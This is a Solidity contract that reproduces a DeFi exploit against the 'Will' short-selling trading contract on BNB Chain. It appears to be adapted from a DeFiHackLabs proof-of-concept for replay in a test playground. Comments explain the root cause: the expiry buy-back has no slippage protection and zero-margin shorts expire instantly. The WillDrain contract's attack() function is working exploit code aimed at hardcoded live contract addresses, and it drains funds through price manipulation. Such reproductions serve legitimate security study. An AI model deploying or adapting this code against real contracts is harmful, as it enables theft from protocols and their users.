// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-Will).
//
// The DeFiHackLabs PoC (test/Will_exp.sol) runs the whole attack INLINE in the
// Foundry `ContractTest is Test` contract (attacker = address(this); there is
// no standalone exploit/attack contract deployed anywhere in the original
// test — `attack()` is just a plain function on the test itself, called
// directly). This contract is a faithful, self-contained copy of that inline
// attack (testExploit -> attack -> swap_token_to_token) so the playground can
// deploy it and record attack(). Logic, call order, and constants are copied
// verbatim from test/Will_exp.sol.
//
// Root cause: the `trading` short-selling contract's expiry settlement
// (updateExpiredOrders + settleExpiredPositions) buys back 1.8x the short
// notional from a single PancakeSwap pool with NO slippage protection
// (minTokensToReceive is caller-supplied and passed as 0). A short opened
// with margin=0 is instantly expired (closeTime == block.timestamp), so an
// attacker can open a self-short, buy the dumped token cheaply, force the
// contract to slippage-free buy the token back (pumping its price with the
// contract's own USDT), and sell into the pumped price for profit.
//
// NOTE ON updateExpiredOrders(): the original test calls updateExpiredOrders()
// itself, which only picks up an order once `closeTime < block.timestamp`
// (strictly less than) — the test satisfies this with `vm.warp(+20)` between
// opening the order and calling it. The EVM Playground's recorder pins ONE
// fixed block (one timestamp) for the entire replay, so that mid-sequence warp
// cannot be reproduced by calling updateExpiredOrders() itself here. The
// config's `setup.steps` instead writes trading's `expiredNotClosedUSDT`
// storage slot (slot 6) directly to the exact value updateExpiredOrders()
// would have computed (1.8 x 71,000 = 127,800 USDT, confirmed against the
// original trace's storage diff) — mirroring Foundry `vm.store`. This changes
// nothing about the exploited mechanism: settleExpiredPositions() (called
// here, recorded) still performs the same slippage-free 1.8x buy-back that is
// the actual vulnerability.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface Trading {
    function placeSellOrder(uint256 usdtAmount, uint256 margin, uint256 minUsdtReceived) external;
    function updateExpiredOrders() external;
    function settleExpiredPositions(uint256 minTokensToReceive) external;
}

contract WillDrain {
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 will = IERC20(0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Trading trading = Trading(0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF);

    function attack() external {
        USDT.approve(address(trading), type(uint256).max);
        trading.placeSellOrder(71_000 ether, 0, 0);
        swap_token_to_token(address(USDT), address(will), 88_000 ether);
        ////// step 2 (updateExpiredOrders() is replaced by a setup storeSlot —
        ////// see the header note above; its effect, expiredNotClosedUSDT =
        ////// 127,800 USDT, is applied before this call runs)
        trading.settleExpiredPositions(0);
        uint256 willamount = will.balanceOf(address(this));
        swap_token_to_token(address(will), address(USDT), willamount);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
